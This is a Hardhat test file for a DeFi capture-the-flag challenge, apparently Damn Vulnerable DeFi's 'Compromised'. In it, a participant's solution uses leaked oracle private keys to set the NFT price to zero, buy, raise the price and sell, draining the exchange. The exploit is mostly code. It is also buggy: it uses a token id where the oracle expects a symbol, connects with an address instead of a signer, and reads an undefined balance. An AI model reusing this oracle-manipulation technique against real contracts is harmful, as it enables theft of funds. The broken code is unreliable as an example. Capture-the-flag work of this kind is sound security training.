const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        // better blender the ice up
        const tokenId = "1";
		const passwords = [
            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
        ]
        const wallets = [];
        for (let i = 0; i < passwords.length; i++) {

            // do something with this, just need to get a non void signer::  change 
            // "ethers.provider"  to w'e the fuck hardhat will supply from its network as a provider..... to @franz101
            const wallet = new ethers.Wallet(passwords[i],ethers.provider)
            wallets.push(wallet);
            console.log("x")
            let response = await wallet.sendTransaction({
                to: this.exchange.address,
             });
             console.log("Y")
        }

        for (let i = 0; i < wallets.length; i++) {
            console.log("xc")
			await this.oracle.connect(wallets[i]).postPrice(tokenId, 0);
            console.log("yc")
        }
		await this.exchange.connect(attacker.address).buyOne();
		let exchangeBalance = this.exchange.balance;
		for (let i = 0; i < wallets.length; i++) {
			await this.oracle.connect(wallets[i]).postPrice(tokenId, exchangeBalance);
        }
		
		await this.exchange.connect(attacker.address).sellOne();


    //     const passwords = [
    //         "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
    //         "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
    //     ]


        
    //     for (let i = 0; i < passwords.length; i++) {
            
    //         let privateKey = passwords[i]
    //         let wallet = new ethers.Wallet(privateKey)
    //         console.log(wallet.address)   

    //         // All properties are optional
    //     let transaction = {
    // nonce: 0,
    // gasLimit: 21000,
    // gasPrice: ethers.utils.bigNumberify("20000000000"),

    // to: "0x88a5C2d9919e46F883EB62F7b8Dd9d0CC45bc290",
    // // ... or supports ENS names
    // // to: "ricmoo.firefly.eth",

    // value: ethers.utils.parseEther("1.0"),
    // data: "0x",

    // // This ensures the transaction cannot be replayed on different networks
    // chainId: ethers.utils.getNetwork('homestead').chainId
    // }

    // let signPromise = await  wallet.sign(transaction)

    //       }
    });
    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
